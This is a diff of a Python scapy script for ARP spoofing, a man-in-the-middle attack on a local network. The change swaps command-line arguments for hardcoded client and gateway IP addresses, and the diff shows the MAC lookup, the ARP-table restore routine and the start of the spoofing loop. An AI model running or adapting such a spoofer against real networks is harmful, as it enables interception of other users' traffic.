@@ -1,12 +1,12 @@
 import scapy.all as scapy
 import time
-import argparse
+#import argparse
 
-def get_args():
-    parse = argparse.ArgumentParser()
-    parse.add_argument("-c", "--client", dest="client_ip", help="Enter client IP Address.")
-    parse.add_argument("-g", "--gateway", dest="gateway_ip", help="Enter gateway IP Address")
-    return parse.parse_args()
+#def get_args():
+ #   parse = argparse.ArgumentParser()
+  #  parse.add_argument("-c", "--client", dest="client_ip", help="Enter client IP Address.")
+   # parse.add_argument("-g", "--gateway", dest="gateway_ip", help="Enter gateway IP Address")
+    #return parse.parse_args()
 
 def get_mac_address(target_ip):
     arp_request = scapy.ARP(pdst=target_ip)
@@ -26,9 +26,9 @@ def restore_network(dest_ip, src_ip):
     packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
     scapy.send(packet, count=4, verbose=False)
 
-options = get_args()
-client_ip = options.client_ip
-gateway_ip = options.gateway_ip
+#options = get_args()
+client_ip = "192.168.1.15"
+gateway_ip = "192.168.1.1"
 packet_counter = 0
 try:
     while True:
